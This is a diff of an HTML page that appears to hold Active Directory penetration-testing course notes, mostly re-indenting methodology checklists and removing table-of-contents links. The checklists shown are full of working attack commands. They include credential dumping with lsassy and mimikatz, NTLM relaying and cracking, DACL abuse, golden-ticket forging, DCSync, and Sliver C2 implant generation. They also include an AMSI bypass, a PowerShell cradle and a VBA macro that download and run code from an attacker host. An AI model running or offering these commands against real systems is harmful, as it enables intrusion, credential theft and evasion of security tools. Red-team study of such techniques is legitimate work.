+    <pre><code class="language-bash">crackmapexec smb &lt;DC&gt; -u "" -p "" --rid-brute</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-cme-methodology-wf-3"> Once creds are confirmed, layer NetExec modules to extract further value:
+    <pre><code class="language-bash">netexec smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M slinky -o NAME=share SERVER=&lt;attacker&gt;
 netexec smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M lsassy
 netexec smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M enum_avproducts</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-cme-methodology-wf-4"> Feed captured hashes into cracking (mode 5600 for NTLMv2) or relay with <code>ntlmrelayx</code>:
-<pre><code class="language-bash">hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
+  </li>
+  <li><input type="checkbox" data-id="cape-cme-methodology-wf-4"> Feed captured hashes into cracking (mode 5600 for NTLMv2) or relay with <code>ntlmrelayx</code>:
+    <pre><code class="language-bash">hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
 python ntlmrelayx.py -tf targets.txt -smb2support</code></pre>
-</li>
+  </li>
 </ul>
 <h2 id="cape-kerberos-6">6. Kerberos Attacks</h2>
 <p>Kerberos is the default authentication protocol in Windows domains. Its ticket-based design and stronger crypto were meant to raise the bar over NTLM, but the attack surface has stayed wide open. Pre-authentication weaknesses, service ticket cracking, delegation abuse, and outright ticket forgery all belong here. Understanding the six-step flow between client, KDC, and service is the prerequisite for every attack that follows; skip that and the tooling starts feeling like magic.</p>
@@ -1971,25 +1971,25 @@ Add-DomainGroupMember -Identity '&lt;target-group&gt;' -Members &lt;attacker-use
 <pre><code class="language-bash">bloodyAD --host &lt;target-ip&gt; -u &lt;username&gt; -k set password 'CN=TargetUser,CN=Users,DC=<domain>,DC=<tld>' '<new-password>'</code></pre>
 <p>Once the target's password is under your control, use it for any downstream tooling, WinRM, RDP, PsExec, etc.</p>
 
-<h3 id="cape-dacl1-methodology">7.7 Methodology</h3>
+<h4 id="cape-dacl1-methodology">Methodology</h4>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-dacl1-methodology-wf-0"> Load BloodHound and identify Outbound Object Control edges from your foothold user.</li>
-<li><input type="checkbox" data-id="cape-dacl1-methodology-wf-1"> Prioritize short paths: GenericAll → group membership → next tier of access.</li>
-<li><input type="checkbox" data-id="cape-dacl1-methodology-wf-2"> Request a Kerberos TGT with <code>getTGT.py</code> where LDAPS is required and NTLM is disabled:
-<pre><code class="language-bash">export KRB5CCNAME=/root/user.ccache
+  <li><input type="checkbox" data-id="cape-dacl1-methodology-wf-0"> Load BloodHound and identify Outbound Object Control edges from your foothold user.</li>
+  <li><input type="checkbox" data-id="cape-dacl1-methodology-wf-1"> Prioritize short paths: GenericAll → group membership → next tier of access.</li>
+  <li><input type="checkbox" data-id="cape-dacl1-methodology-wf-2"> Request a Kerberos TGT with <code>getTGT.py</code> where LDAPS is required and NTLM is disabled:
+    <pre><code class="language-bash">export KRB5CCNAME=/root/user.ccache
 getTGT.py 'domain.local/user:pass'</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-dacl1-methodology-wf-3"> Use BloodyAD to modify DACLs:
-<pre><code class="language-bash">bloodyAD --host &lt;dc&gt; -u user -p pass add genericAll 'CN=Target,DC=domain,DC=local' user</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-dacl1-methodology-wf-4"> Add yourself to a group with GenericAll:
-<pre><code class="language-bash">bloodyAD --host &lt;dc&gt; -u user -p pass add groupMember 'CN=Target Group,CN=Users,DC=domain,DC=local' user</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-dacl1-methodology-wf-5"> Reset another user's password with ForceChangePassword:
-<pre><code class="language-bash">bloodyAD --host &lt;dc&gt; -u user -p pass set password 'CN=Target,CN=Users,DC=domain,DC=local' '<new-password>'</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-dacl1-methodology-wf-6"> Validate each step before proceeding, a failed ACL write on a monitored object is noisy.</li>
-<li><input type="checkbox" data-id="cape-dacl1-methodology-wf-7"> Log every temporary permission you grant yourself; remove them after use.</li>
+  </li>
+  <li><input type="checkbox" data-id="cape-dacl1-methodology-wf-3"> Use BloodyAD to modify DACLs:
+    <pre><code class="language-bash">bloodyAD --host &lt;dc&gt; -u user -p pass add genericAll 'CN=Target,DC=domain,DC=local' user</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-dacl1-methodology-wf-4"> Add yourself to a group with GenericAll:
+    <pre><code class="language-bash">bloodyAD --host &lt;dc&gt; -u user -p pass add groupMember 'CN=Target Group,CN=Users,DC=domain,DC=local' user</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-dacl1-methodology-wf-5"> Reset another user's password with ForceChangePassword:
+    <pre><code class="language-bash">bloodyAD --host &lt;dc&gt; -u user -p pass set password 'CN=Target,CN=Users,DC=domain,DC=local' '<new-password>'</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-dacl1-methodology-wf-6"> Validate each step before proceeding, a failed ACL write on a monitored object is noisy.</li>
+  <li><input type="checkbox" data-id="cape-dacl1-methodology-wf-7"> Log every temporary permission you grant yourself; remove them after use.</li>
 </ul>
 <h2 id="cape-dacl-2-8">8. DACL Attacks II</h2>
 <p>The second half of DACL work moves past the classic ACE edges and into the privileges and group memberships that quietly grant equivalent access. DCSync, SeBackupPrivilege, SeManageVolumePrivilege, PAC exploitation, Server Operators, DNS Admins, and macro-driven DCOM all belong in this bucket. Each hinges on a specific permission or group membership whose implications are not obvious to whoever provisioned it, and each shows up in real environments far more often than it should.</p>
@@ -3180,33 +3180,33 @@ Get-DomainUser -Domain &lt;trusted-domain.local&gt; -Properties samaccountname, 
 mimikatz # lsadump::trust /patch</code></pre>
 <p>The trust key from a one-way inbound trust lets an attacker on the trusting side act as any user in the trusted domain against resources shared through the trust.</p>
 
-<h3 id="cape-trust-methodology">11.7 Methodology</h3>
+<h4 id="cape-trust-methodology">Methodology</h4>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-trust-methodology-wf-0"> Map the forest topology:
-<pre><code class="language-powershell">Get-DomainTrust
+  <li><input type="checkbox" data-id="cape-trust-methodology-wf-0"> Map the forest topology:
+    <pre><code class="language-powershell">Get-DomainTrust
 Get-ForestTrust
 nltest /domain_trusts /all_trusts</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-trust-methodology-wf-1"> Identify inter-forest trust directions and any SID filtering weaknesses.</li>
-<li><input type="checkbox" data-id="cape-trust-methodology-wf-2"> Where DA in the current forest is held, extract trust keys:
-<pre><code class="language-bash">Invoke-Mimikatz -Command '"lsadump::trust /patch"'</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-trust-methodology-wf-3"> Forge an inter-realm TGT with the trust key:
-<pre><code class="language-bash">Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:current.local /sid:&lt;SID&gt; /rc4:&lt;TrustKey&gt; /service:krbtgt /target:target.local /ticket:trust.kirbi"'
+  </li>
+  <li><input type="checkbox" data-id="cape-trust-methodology-wf-1"> Identify inter-forest trust directions and any SID filtering weaknesses.</li>
+  <li><input type="checkbox" data-id="cape-trust-methodology-wf-2"> Where DA in the current forest is held, extract trust keys:
+    <pre><code class="language-bash">Invoke-Mimikatz -Command '"lsadump::trust /patch"'</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-trust-methodology-wf-3"> Forge an inter-realm TGT with the trust key:
+    <pre><code class="language-bash">Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:current.local /sid:&lt;SID&gt; /rc4:&lt;TrustKey&gt; /service:krbtgt /target:target.local /ticket:trust.kirbi"'
 .\Rubeus.exe asktgs /ticket:trust.kirbi /service:"cifs/fs.target.local" /ptt</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-trust-methodology-wf-4"> Enumerate MSSQL instances across trusted forests, link chains often span trust boundaries:
-<pre><code class="language-powershell">Get-SQLInstanceDomain
+  </li>
+  <li><input type="checkbox" data-id="cape-trust-methodology-wf-4"> Enumerate MSSQL instances across trusted forests, link chains often span trust boundaries:
+    <pre><code class="language-powershell">Get-SQLInstanceDomain
 Get-SQLServerLinkCrawl -Instance &lt;spn&gt; -Query "exec master..xp_cmdshell 'whoami'"</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-trust-methodology-wf-5"> Look for unconstrained delegation on non-DC hosts; coerce a target-forest DC to authenticate:
-<pre><code class="language-bash">Rubeus.exe monitor /interval:5 /filteruser:<target-dc>$
+  </li>
+  <li><input type="checkbox" data-id="cape-trust-methodology-wf-5"> Look for unconstrained delegation on non-DC hosts; coerce a target-forest DC to authenticate:
+    <pre><code class="language-bash">Rubeus.exe monitor /interval:5 /filteruser:<target-dc>$
 SpoolSample.exe target-dc.external.local dc.compromised.local
 Rubeus.exe ptt /ticket:&lt;base64&gt;</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-trust-methodology-wf-6"> With a target-forest DC ticket or hash, DCSync the external forest:
-<pre><code class="language-bash">mimikatz # lsadump::dcsync /domain:<external-domain.local> /all</code></pre>
-</li>
+  </li>
+  <li><input type="checkbox" data-id="cape-trust-methodology-wf-6"> With a target-forest DC ticket or hash, DCSync the external forest:
+    <pre><code class="language-bash">mimikatz # lsadump::dcsync /domain:<external-domain.local> /all</code></pre>
+  </li>
 </ul>
 <h2 id="cape-c2-sliver-12">12. Intro to C2 Operations with Sliver</h2>
 <p>Sliver is BishopFox's open-source C2, aimed at red teams looking for an alternative to Cobalt Strike without giving up modern features. Every implant gets its own asymmetric key pair, so burning one does not compromise the rest of the fleet. Transport options cover mTLS, WireGuard, HTTP(S), and DNS, which is more than enough to build resilient callback paths through most egress filters.</p>
@@ -3425,39 +3425,39 @@ sliver-client import &lt;operator-name&gt;.cfg
 sliver-client</code></pre>
 <p>Combined with the Armory and shared aliases, multiplayer turns Sliver from a single-operator tool into a team infrastructure comparable to Cobalt Strike's team-server model.</p>
 
-<h3 id="cape-sliver-methodology">12.15 Methodology</h3>
+<h4 id="cape-sliver-methodology">Methodology</h4>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-sliver-methodology-wf-0"> Deploy the Sliver server on infrastructure separate from your attacker workstation:
-<pre><code class="language-bash">curl https://sliver.sh/install | sudo bash
+  <li><input type="checkbox" data-id="cape-sliver-methodology-wf-0"> Deploy the Sliver server on infrastructure separate from your attacker workstation:
+    <pre><code class="language-bash">curl https://sliver.sh/install | sudo bash
 sliver-server</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-sliver-methodology-wf-1"> Create an HTTP or HTTPS listener; add DNS fallback for resilient beacon channels:
-<pre><code class="language-bash">https
+  </li>
+  <li><input type="checkbox" data-id="cape-sliver-methodology-wf-1"> Create an HTTP or HTTPS listener; add DNS fallback for resilient beacon channels:
+    <pre><code class="language-bash">https
 dns --domains c2.example.com
 jobs</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-sliver-methodology-wf-2"> Generate an implant matching the target platform:
-<pre><code class="language-bash">generate --http &lt;ip&gt; --save <save-path>
+  </li>
+  <li><input type="checkbox" data-id="cape-sliver-methodology-wf-2"> Generate an implant matching the target platform:
+    <pre><code class="language-bash">generate --http &lt;ip&gt; --save <save-path>
 generate beacon --http &lt;ip&gt; --seconds 60 --jitter 30 --save <save-path></code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-sliver-methodology-wf-3"> Deliver via a phishing payload, malicious document, or existing foothold.</li>
-<li><input type="checkbox" data-id="cape-sliver-methodology-wf-4"> Once the session lands, run the initial recon commands:
-<pre><code class="language-bash">sessions
+  </li>
+  <li><input type="checkbox" data-id="cape-sliver-methodology-wf-3"> Deliver via a phishing payload, malicious document, or existing foothold.</li>
+  <li><input type="checkbox" data-id="cape-sliver-methodology-wf-4"> Once the session lands, run the initial recon commands:
+    <pre><code class="language-bash">sessions
 use &lt;session_id&gt;
 info
 whoami
 getprivs
 ps</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-sliver-methodology-wf-5"> Map the segment with net scan and portscan:
-<pre><code class="language-bash">net scan <subnet>
+  </li>
+  <li><input type="checkbox" data-id="cape-sliver-methodology-wf-5"> Map the segment with net scan and portscan:
+    <pre><code class="language-bash">net scan <subnet>
 portscan <target-ip></code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-sliver-methodology-wf-6"> Layer AD persistence attacks on top of Sliver's execution primitives:
-<pre><code class="language-bash">execute-assembly Rubeus.exe golden /user:Administrator /domain:<domain.local> /sid:&lt;SID&gt; /krbtgt:&lt;hash&gt; /ptt
+  </li>
+  <li><input type="checkbox" data-id="cape-sliver-methodology-wf-6"> Layer AD persistence attacks on top of Sliver's execution primitives:
+    <pre><code class="language-bash">execute-assembly Rubeus.exe golden /user:Administrator /domain:<domain.local> /sid:&lt;SID&gt; /krbtgt:&lt;hash&gt; /ptt
 execute-assembly SharpKatz.exe --Command dcsync --User krbtgt --Domain <domain.local> --DomainController <dc-fqdn></code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-sliver-methodology-wf-7"> Rotate C2 channels and rebuild implants regularly during long engagements.</li>
+  </li>
+  <li><input type="checkbox" data-id="cape-sliver-methodology-wf-7"> Rotate C2 channels and rebuild implants regularly during long engagements.</li>
 </ul>
 <h2 id="cape-evasion-13">13. Introduction to Windows Evasion Techniques</h2>
 <p>Modern Windows presents an evasion problem in three layers: static signature detection on artifacts, runtime scanning as code executes, and application whitelisting deciding what gets to run at all. Getting past each layer means understanding what triggers the detection and either changing what the sensor sees, or moving execution to a code path the sensor does not inspect. The techniques in this section are the primitives, not the payloads; combining them properly is what makes the difference between a burnt tool and a landed implant.</p>
@@ -3788,36 +3788,36 @@ CreateProcess(NULL, "notepad.exe C:\\Windows\\System32\\drivers\\etc\\hosts",
               NULL, NULL, &amp;si.StartupInfo, &amp;pi);
 // PEB rewrite of ProcessParameters-&gt;CommandLine happens here, then ResumeThread(pi.hThread)</code></pre>
 
-<h3 id="cape-evasion-methodology">13.15 Methodology</h3>
+<h4 id="cape-evasion-methodology">Methodology</h4>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-evasion-methodology-wf-0"> Fingerprint the AV product in play, bypass techniques differ by vendor:
-<pre><code class="language-powershell">Get-Service | Where-Object {$_.DisplayName -like "*Defender*" -or $_.DisplayName -like "*CrowdStrike*" -or $_.DisplayName -like "*SentinelOne*"}
+  <li><input type="checkbox" data-id="cape-evasion-methodology-wf-0"> Fingerprint the AV product in play, bypass techniques differ by vendor:
+    <pre><code class="language-powershell">Get-Service | Where-Object {$_.DisplayName -like "*Defender*" -or $_.DisplayName -like "*CrowdStrike*" -or $_.DisplayName -like "*SentinelOne*"}
 Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, AntivirusEnabled</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-evasion-methodology-wf-1"> Split any payload with <code>Find-AVSignature</code> to isolate what's being detected:
-<pre><code class="language-powershell">Find-AVSignature -StartByte 0 -EndByte max -Interval 100 -Path mal.exe -OutPath mal_1 -Verbose -Force</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-evasion-methodology-wf-2"> Zero out flagged bytes and re-test:
-<pre><code class="language-powershell">$bytes = [System.IO.File]::ReadAllBytes("mal.exe")
+  </li>
+  <li><input type="checkbox" data-id="cape-evasion-methodology-wf-1"> Split any payload with <code>Find-AVSignature</code> to isolate what's being detected:
+    <pre><code class="language-powershell">Find-AVSignature -StartByte 0 -EndByte max -Interval 100 -Path mal.exe -OutPath mal_1 -Verbose -Force</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-evasion-methodology-wf-2"> Zero out flagged bytes and re-test:
+    <pre><code class="language-powershell">$bytes = [System.IO.File]::ReadAllBytes("mal.exe")
 $bytes[1111] = 0
 [System.IO.File]::WriteAllBytes("mal_mod.exe", $bytes)</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-evasion-methodology-wf-3"> Prefer in-memory PowerShell loaders, reduces on-disk artifacts:
-<pre><code class="language-powershell">IEX (New-Object Net.WebClient).DownloadString('http://&lt;attacker&gt;/loader.ps1')</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-evasion-methodology-wf-4"> Disable or bypass AMSI early in a PowerShell session:
-<pre><code class="language-powershell">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-evasion-methodology-wf-5"> If CLM is enforced, use InstallUtil, MSBuild, or an unmanaged assembly execution primitive:
-<pre><code class="language-bash">C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\path\to\malicious.exe</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-evasion-methodology-wf-6"> For macros, VBA-stomp and use WMI to break parent-child chains:
-<pre><code class="language-vb">Sub MyMacro
+  </li>
+  <li><input type="checkbox" data-id="cape-evasion-methodology-wf-3"> Prefer in-memory PowerShell loaders, reduces on-disk artifacts:
+    <pre><code class="language-powershell">IEX (New-Object Net.WebClient).DownloadString('http://&lt;attacker&gt;/loader.ps1')</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-evasion-methodology-wf-4"> Disable or bypass AMSI early in a PowerShell session:
+    <pre><code class="language-powershell">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-evasion-methodology-wf-5"> If CLM is enforced, use InstallUtil, MSBuild, or an unmanaged assembly execution primitive:
+    <pre><code class="language-bash">C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\path\to\malicious.exe</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-evasion-methodology-wf-6"> For macros, VBA-stomp and use WMI to break parent-child chains:
+    <pre><code class="language-vb">Sub MyMacro
   strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://&lt;attacker&gt;/run.txt'))"
   GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
 End Sub</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-evasion-methodology-wf-7"> Test every payload in a Defender-enabled sandbox before deploying to a real engagement.</li>
+  </li>
+  <li><input type="checkbox" data-id="cape-evasion-methodology-wf-7"> Test every payload in a Defender-enabled sandbox before deploying to a real engagement.</li>
 </ul>
 
 <h4 id="cape-evasion-methodology-runner">13.15.1 Combined Shellcode Runner</h4>
@@ -4247,7 +4247,6 @@ python3 PXEThief.py decrypt -f &lt;policy-blob&gt;</code></pre>
       </div>
       <a href="#cape-ldap-rpcclient">1.5 rpcclient over MSRPC</a>
       <a href="#cape-ldap-rid-brute">1.6 RID Brute Force</a>
-      <a href="#cape-ldap-methodology">1.7 Methodology</a>
     </div>
   </div>
   <div class="section-flow-2">
@@ -4270,7 +4269,6 @@ python3 PXEThief.py decrypt -f &lt;policy-blob&gt;</code></pre>
       <a href="#cape-powerview-dsquery">2.13 AD Enumeration with dsquery</a>
       <a href="#cape-powerview-adalanche">2.14 Adalanche</a>
       <a href="#cape-powerview-clixml">2.15 Exporting Objects</a>
-      <a href="#cape-powerview-methodology">2.16 Methodology</a>
     </div>
   </div>
   <div class="section-flow-3">
@@ -4305,7 +4303,6 @@ python3 PXEThief.py decrypt -f &lt;policy-blob&gt;</code></pre>
       <a href="#cape-bloodhound-custom-cypher">3.25 Custom Cypher Queries</a>
       <a href="#cape-bloodhound-owned-highvalue">3.26 Marking Owned and High Value</a>
       <a href="#cape-bloodhound-adcs-ingestion">3.27 ADCS Ingestion</a>
-      <a href="#cape-bloodhound-methodology">3.28 Methodology</a>
     </div>
   </div>
   <div class="section-flow-4">
@@ -4347,7 +4344,6 @@ python3 PXEThief.py decrypt -f &lt;policy-blob&gt;</code></pre>
           <a href="#cape-lateral-socks">4.12.4 Dynamic SOCKS</a>
         </div>
       </div>
-      <a href="#cape-lateral-methodology">4.13 Methodology</a>
     </div>
   </div>
   <div class="section-flow-5">
@@ -4382,7 +4378,6 @@ python3 PXEThief.py decrypt -f &lt;policy-blob&gt;</code></pre>
       <a href="#cape-cme-kerberos">5.6 Kerberos Authentication</a>
       <a href="#cape-cme-netexec">5.7 NetExec Modules</a>
       <a href="#cape-cme-responder-integration">5.8 Responder Integration</a>
-      <a href="#cape-cme-methodology">5.9 Methodology</a>
     </div>
   </div>
   <div class="section-flow-6">
@@ -4421,7 +4416,6 @@ python3 PXEThief.py decrypt -f &lt;policy-blob&gt;</code></pre>
       <a href="#cape-dacl1-writing-dacl">7.4 Writing DACL</a>
       <a href="#cape-dacl1-postex-add-member">7.5 Add to Group</a>
       <a href="#cape-dacl1-postex-password">7.6 Change Password</a>
-      <a href="#cape-dacl1-methodology">7.7 Methodology</a>
     </div>
   </div>
   <div class="section-flow-8">
@@ -4595,7 +4589,6 @@ python3 PXEThief.py decrypt -f &lt;policy-blob&gt;</code></pre>
       <a href="#cape-trust-sidhistory">11.4 SID History Injection</a>
       <a href="#cape-trust-foreign-principals">11.5 Foreign Security Principals</a>
       <a href="#cape-trust-oneway">11.6 One-Way Trust Exploitation</a>
-      <a href="#cape-trust-methodology">11.7 Methodology</a>
     </div>
   </div>
   <div class="section-flow-12">
@@ -4629,7 +4622,6 @@ python3 PXEThief.py decrypt -f &lt;policy-blob&gt;</code></pre>
       <a href="#cape-sliver-armory">12.12 Armory</a>
       <a href="#cape-sliver-wireguard">12.13 WireGuard Listener</a>
       <a href="#cape-sliver-multiplayer">12.14 Multiplayer Mode</a>
-      <a href="#cape-sliver-methodology">12.15 Methodology</a>
     </div>
   </div>
   <div class="section-flow-13">
@@ -4723,7 +4715,6 @@ python3 PXEThief.py decrypt -f &lt;policy-blob&gt;</code></pre>
       <a href="#cape-evasion-sleep-obfuscation">13.12 Sleep Obfuscation</a>
       <a href="#cape-evasion-api-hashing">13.13 API Hashing</a>
       <a href="#cape-evasion-pid-cmdline">13.14 PID / Cmdline Spoofing</a>
-      <a href="#cape-evasion-methodology">13.15 Methodology</a>
     </div>
   </div>
   <div class="section-flow-14">
